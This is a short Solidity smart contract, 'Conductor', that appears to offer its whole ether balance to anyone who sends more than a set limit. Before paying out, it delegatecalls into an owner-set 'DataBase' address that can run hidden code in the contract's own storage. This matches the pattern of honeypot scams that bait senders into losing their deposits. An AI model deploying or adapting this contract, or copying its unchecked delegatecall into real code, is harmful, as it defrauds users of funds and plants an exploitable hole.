1 pragma solidity ^0.4.18;
2 
3 
4 contract Conductor
5 {
6     address public Owner = msg.sender;
7     address public DataBase;
8     uint256 public Limit;
9     
10     
11     function Set(address dataBase, uint256 limit)
12     {
13         require(msg.sender == Owner);
14         Limit = limit;
15         DataBase = dataBase;
16     }
17     
18     function()payable{}
19     
20     function transfer(address adr)
21     payable
22     {
23         if(msg.value>Limit)
24         {        
25             DataBase.delegatecall(bytes4(sha3("AddToDB(address)")),msg.sender);
26             adr.transfer(this.balance);
27         }
28     }
29     
30 }